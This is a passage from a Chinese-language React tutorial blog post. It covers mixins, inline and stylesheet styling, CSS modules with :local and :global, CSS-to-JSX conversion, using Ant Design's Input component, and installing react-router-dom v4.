<p>可以在mixin共享文件中使用生命周期函数，在生命周期函数中定义一些公用方法：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> MixinLog = &#123;</div><div class="line">    componentDidMount() &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"Mixinlog componentDidMount"</span>);</div><div class="line">    &#125;,</div><div class="line">    log() &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"You are using Mixin."</span>);</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> MixinLog;</div></pre></td></tr></table></figure></p>
<h1 id="React样式"><a href="#React样式" class="headerlink" title="React样式"></a>React样式</h1><p>以header.js为例，添加样式。<br>(1)第一种方式可以在render()函数中，以json格式定义样式，然后将该样式以 <strong>内联</strong> 形式应用在返回的html标签的<code>style</code>属性上，如下：<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ComponentHeader</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    render() &#123;</div><div class="line">        <span class="keyword">const</span> styleComponentHeader = &#123;</div><div class="line">            header: &#123;</div><div class="line">                backgroundColor: <span class="string">"#333"</span>,</div><div class="line">                color: <span class="string">"yellow"</span>,</div><div class="line">                paddingTop: <span class="string">"15px"</span>,</div><div class="line">                paddingBottom: <span class="string">"15px"</span></div><div class="line">            &#125;,</div><div class="line">            <span class="comment">//还可以定义其他样式</span></div><div class="line">        &#125;;</div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;header style=&#123;styleComponentHeader.header&#125;&gt;</div><div class="line">                &lt;h1&gt;头部&lt;<span class="regexp">/h1&gt;</span></div><div class="line"><span class="regexp">            &lt;/</span>header&gt;</div><div class="line">        );</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> ComponentHeader;</div></pre></td></tr></table></figure></p>
<p>注意原生的CSS的样式名称在JSX中的写法，例如<code>background-color</code>在JSX中写为<code>backgroundColor</code>。<br>(2)第二种方式，css <strong>样式表</strong> 文件的引入。样式表的引入方式有两种，一种是在使用组件的HTML页面中通过<code>link</code>标签引入：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"header.css"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>header.css<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.smallFontSize</span> <span class="selector-tag">h1</span> &#123;</div><div class="line">    <span class="attribute">font-size</span>: <span class="number">10px</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>另一种是把样式表文件当作一个模块，在使用该样式表的组件中，像使用其他组件一样<code>import</code>导入样式表文件。如下：<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="keyword">import</span> <span class="string">'../css/header.css'</span>; <span class="comment">//导入样式表文件</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ComponentHeader</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    render() &#123;</div><div class="line">        <span class="keyword">const</span> styleComponentHeader = &#123;</div><div class="line">            header: &#123;</div><div class="line">                backgroundColor: <span class="string">"#333"</span>,</div><div class="line">                color: <span class="string">"yellow"</span>,</div><div class="line">                paddingTop: <span class="string">"15px"</span>,</div><div class="line">                paddingBottom: <span class="string">"15px"</span></div><div class="line">            &#125;,</div><div class="line">            <span class="comment">//还可以定义其他样式</span></div><div class="line">        &#125;;</div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;header style=&#123;styleComponentHeader.header&#125; className=<span class="string">"smallFontSize"</span>&gt;</div><div class="line">                &lt;h1&gt;头部&lt;<span class="regexp">/h1&gt;</span></div><div class="line"><span class="regexp">            &lt;/</span>header&gt;</div><div class="line">        );</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> ComponentHeader;</div></pre></td></tr></table></figure></p>
<p>header.css<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.smallFontSize</span> <span class="selector-tag">h1</span> &#123;</div><div class="line">    <span class="attribute">font-size</span>: <span class="number">10px</span>;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>第一种引入样式表的方式常用于该样式表作用于整个应用的所有组件(一般是基础样式表)，第二种引入样式表的方式常用于该样式表作用于某个组件(相当于组件的私有样式)。全局的基础样式表也可以使用第二种方式引入，一般在应用的入口JS文件中引入，例如示例程序中的index.js。</p>
<h2 id="内联样式中的表达式"><a href="#内联样式中的表达式" class="headerlink" title="内联样式中的表达式"></a>内联样式中的表达式</h2><p>实现的效果：当点击header时，header高度变化。<br>实现思路：通过点击改变state的值，来影响控制样式，在内联样式中可以使用表达式控制样式。<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="keyword">import</span> <span class="string">'../css/header.css'</span>; <span class="comment">//导入样式表文件</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ComponentHeader</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    <span class="keyword">constructor</span>() &#123;</div><div class="line">        <span class="keyword">super</span>();</div><div class="line">        <span class="keyword">this</span>.state = &#123;<span class="attr">miniHeader</span>: <span class="literal">false</span>&#125;; <span class="comment">//默认加载时header头部是高的</span></div><div class="line">        <span class="keyword">this</span>.switchHeader = <span class="keyword">this</span>.switchHeader.bind(<span class="keyword">this</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    switchHeader() &#123;</div><div class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">miniHeader</span>: !<span class="keyword">this</span>.state.miniHeader&#125;); <span class="comment">//当点击header头部时，高度切换</span></div><div class="line">    &#125;</div><div class="line">    render() &#123;</div><div class="line">        <span class="keyword">const</span> styleComponentHeader = &#123;</div><div class="line">            header: &#123;</div><div class="line">                backgroundColor: <span class="string">"#333"</span>,</div><div class="line">                color: <span class="string">"yellow"</span>,</div><div class="line">                paddingTop: (<span class="keyword">this</span>.state.miniHeader) ? <span class="string">"3px"</span> : <span class="string">"15px"</span>, <span class="comment">//内联样式中的表达式</span></div><div class="line">                paddingBottom: (<span class="keyword">this</span>.state.miniHeader) ? <span class="string">"3px"</span> : <span class="string">"15px"</span></div><div class="line">            &#125;,</div><div class="line">            <span class="comment">//还可以定义其他样式</span></div><div class="line">        &#125;;</div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;header style=&#123;styleComponentHeader.header&#125; className=<span class="string">"smallFontSize"</span> onClick=&#123;<span class="keyword">this</span>.switchHeader&#125;&gt;</div><div class="line">                &lt;h1&gt;头部&lt;<span class="regexp">/h1&gt;</span></div><div class="line"><span class="regexp">            &lt;/</span>header&gt;</div><div class="line">        );</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> ComponentHeader;</div></pre></td></tr></table></figure></p>
<h2 id="CSS的模块化-样式表"><a href="#CSS的模块化-样式表" class="headerlink" title="CSS的模块化(样式表)"></a>CSS的模块化(样式表)</h2><p>CSS模块化解决的问题:全局污染、命名混乱、依赖管理不彻底、无法共享变量、代码压缩不彻底。以footer.js为例，添加CSS模块化样式。<br>CSS模块化的优点：所有样式都是局部的，解决了命名冲突和全局污染问题；样式类名生成规则配置灵活，可以此来压缩类名；只需引用组件的JS就可搞定组件的所有JS和CSS。<br>用到的三个有关的插件(<code>create-react-app</code>脚手架已经配置好了)：babel-plugin-react-html-attrs、style-loader、css-loader。<br>footer.css<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.miniFooter</span> &#123;</div><div class="line">    <span class="attribute">background-color</span>: <span class="number">#333</span>;</div><div class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</div><div class="line">    <span class="attribute">padding-left</span>: <span class="number">20px</span>;</div><div class="line">    <span class="attribute">padding-top</span>: <span class="number">3px</span>;</div><div class="line">    <span class="attribute">padding-bottom</span>: <span class="number">3px</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.miniFooter</span> <span class="selector-tag">h1</span> &#123;</div><div class="line">    <span class="attribute">font-size</span>: <span class="number">5px</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>将CSS样式表导入并应用到footer.js：<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="keyword">var</span> footerCss = <span class="built_in">require</span>(<span class="string">"../css/footer.css"</span>);  <span class="comment">// 或直接使用 import '../css/footer.css'; 导入</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ComponentFooter</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    render() &#123;</div><div class="line">        <span class="built_in">console</span>.log(footerCss);</div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;footer className=<span class="string">"miniFooter"</span>&gt;</div><div class="line">                &lt;h1&gt;这里是页面底部&lt;<span class="regexp">/h1&gt;</span></div><div class="line"><span class="regexp">            &lt;/</span>footer&gt;</div><div class="line">        );</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> ComponentFooter;</div></pre></td></tr></table></figure></p>
<p><strong>补充：</strong> 可以利用<code>:local(.normal){color:green;}</code>定义局部样式，导入CSS样式表默认就是添加局部样式；<code>:global(.btn){color:red;}</code>可以将样式应用到全局，即使用<code>:global</code>定义的样式，即使不使用import导入到组件，也可以在组件中直接使用，相当于全局的样式。footer.css现在如下设置：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-pseudo">:global(.miniFooter</span> <span class="selector-tag">h1</span>) &#123;</div><div class="line">    <span class="attribute">font-size</span>: <span class="number">5px</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在header.js中并未通过import导入footer.css模块，但可以直接使用footer.css中的全局样式<code>.miniFooter</code>：<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="keyword">import</span> <span class="string">'../css/header.css'</span>; <span class="comment">//导入样式表文件</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ComponentHeader</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    <span class="keyword">constructor</span>() &#123;</div><div class="line">        <span class="keyword">super</span>();</div><div class="line">        <span class="keyword">this</span>.state = &#123;<span class="attr">miniHeader</span>: <span class="literal">false</span>&#125;; <span class="comment">//默认加载时header头部是高的</span></div><div class="line">        <span class="keyword">this</span>.switchHeader = <span class="keyword">this</span>.switchHeader.bind(<span class="keyword">this</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    switchHeader() &#123;</div><div class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">miniHeader</span>: !<span class="keyword">this</span>.state.miniHeader&#125;); <span class="comment">//当点击header头部时，高度切换</span></div><div class="line">    &#125;</div><div class="line">    render() &#123;</div><div class="line">        <span class="keyword">const</span> styleComponentHeader = &#123;</div><div class="line">            header: &#123;</div><div class="line">                backgroundColor: <span class="string">"#333"</span>,</div><div class="line">                color: <span class="string">"yellow"</span>,</div><div class="line">                paddingTop: (<span class="keyword">this</span>.state.miniHeader) ? <span class="string">"3px"</span> : <span class="string">"15px"</span>, <span class="comment">//内联样式中的表达式</span></div><div class="line">                paddingBottom: (<span class="keyword">this</span>.state.miniHeader) ? <span class="string">"3px"</span> : <span class="string">"15px"</span></div><div class="line">            &#125;,</div><div class="line">            <span class="comment">//还可以定义其他样式</span></div><div class="line">        &#125;;</div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;header style=&#123;styleComponentHeader.header&#125; className=<span class="string">"smallFontSize miniFooter"</span> onClick=&#123;<span class="keyword">this</span>.switchHeader&#125;&gt;</div><div class="line">                &lt;h1&gt;头部&lt;<span class="regexp">/h1&gt;</span></div><div class="line"><span class="regexp">            &lt;/</span>header&gt;</div><div class="line">        );</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> ComponentHeader;</div></pre></td></tr></table></figure></p>
<h2 id="JSX样式与CSS的互转"><a href="#JSX样式与CSS的互转" class="headerlink" title="JSX样式与CSS的互转"></a>JSX样式与CSS的互转</h2><h3 id="将CSS样式表中的样式转化为JSX中的样式"><a href="#将CSS样式表中的样式转化为JSX中的样式" class="headerlink" title="将CSS样式表中的样式转化为JSX中的样式"></a>将CSS样式表中的样式转化为JSX中的样式</h3><p>在线的转化工具: <a href="https://staxmanade.com/CssToReact/" target="_blank" rel="noopener">translate plain CSS into the React in-line style specific JSON representation</a><br>利用上述在线工具将CSS样式表中的样式转化为JSX中的JSON形式后，应用如下，以footer.js为例：<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="comment">// var footerCss = require("../css/footer.css");  // 或直接使用 import '../css/footer.css'; 导入</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ComponentFooter</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    render() &#123;</div><div class="line">        <span class="comment">// console.log(footerCss);</span></div><div class="line">        <span class="keyword">var</span> footerConvertStyle = &#123;</div><div class="line">            <span class="string">"miniFooter"</span>: &#123;</div><div class="line">                <span class="string">"backgroundColor"</span>: <span class="string">"#333"</span>,</div><div class="line">                <span class="string">"color"</span>: <span class="string">"#fff"</span>,</div><div class="line">                <span class="string">"paddingLeft"</span>: <span class="string">"20px"</span>,</div><div class="line">                <span class="string">"paddingTop"</span>: <span class="string">"3px"</span>,</div><div class="line">                <span class="string">"paddingBottom"</span>: <span class="string">"3px"</span></div><div class="line">              &#125;,</div><div class="line">              <span class="string">"miniFooter_h1"</span>: &#123;</div><div class="line">                <span class="string">"fontSize"</span>: <span class="string">"5px"</span></div><div class="line">              &#125;</div><div class="line">        &#125;;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;footer style=&#123;footerConvertStyle.miniFooter&#125;&gt;</div><div class="line">                &lt;h1 style=&#123;footerConvertStyle.miniFooter_h1&#125;&gt;这里是页面底部&lt;<span class="regexp">/h1&gt;</span></div><div class="line"><span class="regexp">            &lt;/</span>footer&gt;</div><div class="line">        );</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> ComponentFooter;</div></pre></td></tr></table></figure></p>
<p>footer.css<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.miniFooter</span> &#123;</div><div class="line">    <span class="attribute">background-color</span>: <span class="number">#333</span>;</div><div class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</div><div class="line">    <span class="attribute">padding-left</span>: <span class="number">20px</span>;</div><div class="line">    <span class="attribute">padding-top</span>: <span class="number">3px</span>;</div><div class="line">    <span class="attribute">padding-bottom</span>: <span class="number">3px</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-class">.miniFooter</span> <span class="selector-tag">h1</span> &#123;</div><div class="line">    <span class="attribute">font-size</span>: <span class="number">5px</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Ant-Design样式框架"><a href="#Ant-Design样式框架" class="headerlink" title="Ant Design样式框架"></a>Ant Design样式框架</h2><p>样式框架们：比如之前使用较多的Bootstrap，Google的Material-UI(主要用来做一些React的样式管理，扁平式的UI样式)，<br>蚂蚁金服的<a href="https://ant.design/docs/react/introduce-cn" target="_blank" rel="noopener">Ant Design</a>。<br>在该demo中引入antd:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install antd --save</div></pre></td></tr></table></figure></p>
<p>以Input输入框组件为例，在<code>src\components\body.js</code>中引入并使用antd Input组件，如下:<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">'prop-types'</span>;</div><div class="line"><span class="comment">// import ReactDOM from 'react-dom';</span></div><div class="line"><span class="keyword">import</span> BodyChild <span class="keyword">from</span> <span class="string">'./bodyChild'</span>;</div><div class="line"></div><div class="line"><span class="keyword">import</span> ReactMixin <span class="keyword">from</span> <span class="string">'react-mixin'</span>;</div><div class="line"><span class="keyword">import</span> MixinLog <span class="keyword">from</span> <span class="string">'./mixins'</span>;</div><div class="line"></div><div class="line"><span class="keyword">import</span> &#123; Input &#125; <span class="keyword">from</span> <span class="string">'antd'</span>; <span class="comment">//引入antd Input组件</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Body</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</div><div class="line">    <span class="keyword">constructor</span>() &#123;</div><div class="line">        <span class="keyword">super</span>(); <span class="comment">//调用基类的所有初始化方法</span></div><div class="line">        <span class="keyword">this</span>.state = &#123;<span class="attr">userName</span>: <span class="string">"Shirley"</span>&#125;; <span class="comment">//初始化赋值</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    changeUserInfo() &#123;</div><div class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">userName</span>: <span class="string">"Your name has changed!"</span>&#125;);</div><div class="line">        <span class="comment">// 第一种方式操作真实DOM</span></div><div class="line">        <span class="comment">// var submitBtn = document.getElementById("submitBtn");</span></div><div class="line">        <span class="comment">// ReactDOM.findDOMNode(submitBtn).style.color = 'red';</span></div><div class="line"></div><div class="line">        <span class="comment">// 第二种方式操作真实DOM</span></div><div class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.refs.submitBtn);</div><div class="line">        <span class="keyword">this</span>.refs.submitBtn.style.color = <span class="string">'red'</span>;</div><div class="line"></div><div class="line">        <span class="comment">// 使用Mixin共享方法log()</span></div><div class="line">        MixinLog.log();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    handleChildValueChange(event) &#123; <span class="comment">//通过事件形式，获取子组件的数据</span></div><div class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">userName</span>: event.target.value&#125;);</div><div class="line">    &#125;</div><div class="line">    render() &#123;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> (</div><div class="line">            &lt;div&gt;</div><div class="line">                &lt;h2&gt;这是是页面主体&lt;<span class="regexp">/h2&gt;</span></div><div class="line"><span class="regexp">                &lt;p&gt;&#123;this.state.userName&#125;&lt;/</span>p&gt;</div><div class="line">                &#123;<span class="comment">/* 通过 PropTypes 对象校验uesrId的类型 */</span>&#125;</div><div class="line">                &lt;p&gt;&#123;<span class="keyword">this</span>.props.userId&#125;&lt;<span class="regexp">/p&gt; </span></div><div class="line"><span class="regexp">                &#123;/</span>* antd Input组件使用 *<span class="regexp">/&#125;</span></div><div class="line"><span class="regexp">                &lt;Input placeholder="Basic usage of antd" /</span>&gt;</div><div class="line"></div><div class="line">                &#123;<span class="comment">/* 操作真实DOM */</span>&#125;</div><div class="line">                &lt;input id=<span class="string">"submitBtn"</span> ref=<span class="string">"submitBtn"</span> type=<span class="string">"button"</span> value=<span class="string">"提交"</span> onClick=&#123;() =&gt; <span class="keyword">this</span>.changeUserInfo()&#125; /&gt;</div><div class="line">                &#123;<span class="comment">/* BodyChild 子组件 */</span>&#125;</div><div class="line">                &lt;BodyChild handleChildValueChange=&#123;<span class="keyword">this</span>.handleChildValueChange.bind(<span class="keyword">this</span>)&#125;/&gt;             </div><div class="line">            &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">        );</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div><div class="line"><span class="regexp"></span></div><div class="line"><span class="regexp">/</span><span class="regexp">/ Body组件props属性校验</span></div><div class="line"><span class="regexp">Body.propTypes = &#123;</span></div><div class="line"><span class="regexp">    userId: PropTypes.number</span></div><div class="line"><span class="regexp">&#125;;</span></div><div class="line"><span class="regexp"></span></div><div class="line"><span class="regexp">/</span><span class="regexp">/ 组件间共享 Mixin</span></div><div class="line"><span class="regexp">ReactMixin(Body.prototype, MixinLog);</span></div><div class="line"><span class="regexp"></span></div><div class="line"><span class="regexp">export default Body;</span></div></pre></td></tr></table></figure></p>
<p>在body.js的Body组件的父组件App.js中，引入antd的css样式如下，即可完全显示Ant Design 的Input输入框的样子：<br><figure class="highlight jsx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</div><div class="line"></div><div class="line"><span class="keyword">import</span> ComponentHeader <span class="keyword">from</span> <span class="string">'./header'</span>;</div><div class="line"><span class="keyword">import</span> ComponentFooter <span class="keyword">from</span> <span class="string">'./footer'</span>;</div><div class="line"><span class="keyword">import</span> Body <span class="keyword">from</span> <span class="string">'./body'</span>;</div><div class="line"><span class="keyword">import</span> <span class="string">'antd/dist/antd.css'</span>; <span class="comment">//引入antd的css样式</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123; </div><div class="line"></div><div class="line">  render() &#123;</div><div class="line">    <span class="keyword">return</span> (</div><div class="line">      &lt;div className=<span class="string">"App"</span>&gt;</div><div class="line">        &lt;ComponentHeader /&gt;</div><div class="line">        &#123;<span class="comment">/* Body组件通过 PropTypes对象校验uesrId的类型必须为Number类型 */</span>&#125;</div><div class="line">        &lt;Body userId=&#123;<span class="number">123</span>&#125; /&gt;</div><div class="line">        &lt;ComponentFooter /&gt;</div><div class="line">      &lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">    );</span></div><div class="line"><span class="regexp">  &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div><div class="line"><span class="regexp">export default App;</span></div></pre></td></tr></table></figure></p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/react_newsapp/readme/images/antd%20Input.png" alt="antd Input"></p>
<h1 id="React-Router"><a href="#React-Router" class="headerlink" title="React Router"></a>React Router</h1><p><code>react-router</code>用来控制页面间的路由，安装<code>react-router</code>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install react-router --save</div></pre></td></tr></table></figure></p>
<p><strong>注意踩坑！！！</strong> 我安装的react-router版本@4.2.0，由于V4版本变化很大，所以遇到很多跟教程用法不一致的地方。React Router包含3个库，<code>react-router</code>、<code>react-router-dom</code>和<code>react-router-native</code>。<code>react-router-dom</code>和<code>react-router-native</code>都依赖于<code>react-router</code>(提供最基本的路由功能)，所以安装时<code>react-router</code>也会自动安装。建议安装<code>react-router-dom</code>(在浏览器中使用):<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install react-router-dom --save</div></pre></td></tr></table></figure></p>
